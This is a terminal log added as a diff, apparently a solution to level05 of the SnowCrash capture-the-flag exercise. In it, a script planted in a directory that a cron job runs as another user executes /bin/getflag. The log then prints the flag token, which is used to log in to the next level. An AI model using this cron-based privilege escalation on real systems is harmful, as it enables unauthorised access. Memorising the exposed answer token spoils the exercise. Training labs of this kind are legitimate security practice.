@@ -1,0 +1,21 @@
+You have new mail.
+level05@SnowCrash:~$ ls -al
+
+*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+echo '`echo /bin/getflag` > /opt/openarenaserver/.test' > test
+
+level05@SnowCrash:~$ cd /opt/openarenaserver/
+level05@SnowCrash:/opt/openarenaserver$ echo '`echo /bin/getflag` > /opt/openarenaserver/.test' > test
+level05@SnowCrash:/opt/openarenaserver$ ls -al
+total 8
+drwxrwxr-x+ 2 root    root    80 May 10 02:39 .
+drwxr-xr-x  1 root    root    60 May  9 22:22 ..
+-rw-rw-r--+ 1 level05 level05 49 May 10 02:39 test
+-rw-rw-r--+ 1 flag05  flag05  58 May  9 22:38 .test
+level05@SnowCrash:/opt/openarenaserver$ cat .test
+Check flag.Here is your token : viuaaale9huek52boumoomioc
+level05@SnowCrash:/opt/openarenaserver$
+
+level05@SnowCrash:~$ su level06
+Password: /viuaaale9huek52boumoomioc/
+level06@SnowCrash:~$
